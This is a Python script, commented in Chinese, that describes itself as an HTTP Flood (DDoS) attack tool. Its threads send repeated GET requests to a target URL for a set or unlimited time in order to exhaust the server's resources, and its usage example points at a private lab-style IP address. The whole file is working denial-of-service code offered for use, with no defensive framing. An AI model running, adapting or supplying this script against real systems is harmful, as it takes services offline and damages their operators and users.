#!/usr/bin/env python3
"""
HTTP Flood 攻击脚本
向目标服务器发送大量 HTTP 请求，消耗服务器资源
"""

import sys
import threading
import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


def http_flood_thread(target_url, thread_id, requests_per_second=10, duration=60):
    """
    单线程 HTTP Flood 攻击
    :param target_url: 目标 URL
    :param thread_id: 线程 ID
    :param requests_per_second: 每秒请求数
    :param duration: 攻击持续时间（秒），0表示无限
    """
    print(f"Thread {thread_id} starting HTTP Flood on {target_url}...")
    
    # 创建会话以复用连接
    session = requests.Session()
    
    # 配置重试策略（对于 DDoS 攻击，我们不需要重试）
    adapter = HTTPAdapter(
        pool_connections=10,
        pool_maxsize=10,
        max_retries=0
    )
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    request_count = 0
    success_count = 0
    error_count = 0
    start_time = time.time()
    end_time = start_time + duration if duration > 0 else float('inf')
    
    while time.time() < end_time:
        try:
            # 控制发送速率
            sleep_time = 1.0 / requests_per_second
            
            # 发送 GET 请求
            response = session.get(target_url, timeout=5)
            request_count += 1
            
            if response.status_code == 200:
                success_count += 1
            else:
                error_count += 1
            
            # 每100个请求打印一次统计
            if request_count % 100 == 0:
                elapsed = time.time() - start_time
                rate = request_count / elapsed
                success_rate = (success_count / request_count) * 100
                print(f"Thread {thread_id}: Sent {request_count} requests, "
                      f"Rate: {rate:.1f} req/s, Success: {success_rate:.1f}%")
            
            time.sleep(sleep_time)
            
        except requests.exceptions.Timeout:
            error_count += 1
            request_count += 1
        except requests.exceptions.ConnectionError:
            error_count += 1
            request_count += 1
            time.sleep(0.1)  # 连接错误时稍微延迟
        except KeyboardInterrupt:
            break
        except Exception as e:
            error_count += 1
            request_count += 1
            if request_count % 100 == 0:
                print(f"Thread {thread_id} error: {e}")
            time.sleep(0.1)
    
    elapsed = time.time() - start_time
    print(f"\nThread {thread_id} finished.")


def http_flood(target_url, num_threads=10, requests_per_second=10, duration=60):
    """
    多线程 HTTP Flood 攻击
    :param target_url: 目标 URL
    :param num_threads: 线程数量
    :param requests_per_second: 每线程每秒请求数
    :param duration: 攻击持续时间（秒），0表示无限
    """
    print("=" * 60)
    print("HTTP Flood Attack")
    print("=" * 60)
    print(f"Target URL: {target_url}")
    print(f"Threads: {num_threads}")
    print(f"Requests per second (per thread): {requests_per_second}")
    print(f"Total expected rate: {num_threads * requests_per_second} req/s")
    print(f"Duration: {'Unlimited' if duration == 0 else f'{duration} seconds'}")
    print("=" * 60)
    print("\nStarting attack in 3 seconds...")
    time.sleep(3)
    
    threads = []
    try:
        # 启动多个攻击线程
        for i in range(num_threads):
            thread = threading.Thread(
                target=http_flood_thread,
                args=(target_url, i + 1, requests_per_second, duration)
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.05)  # 稍微错开启动时间
        
        print(f"\n{num_threads} attack threads started!\n")
        
        # 等待所有线程完成
        for thread in threads:
            thread.join()
        
        print("\n" + "=" * 60)
        print("Attack completed!")
        print("=" * 60)
            
    except KeyboardInterrupt:
        print("\n\nStopping all attack threads...")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 http_flood.py <Target_URL> [threads] [req_per_sec] [duration]")
        print("\nExamples:")
        print("  python3 http_flood.py http://10.10.20.20/api/status?delay=1000 20 10 60")
        sys.exit(1)
    
    target_url = sys.argv[1]
    num_threads = int(sys.argv[2]) if len(sys.argv) > 2 else 10
    req_per_sec = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    duration = int(sys.argv[4]) if len(sys.argv) > 4 else 60
    
    http_flood(target_url, num_threads, req_per_sec, duration)
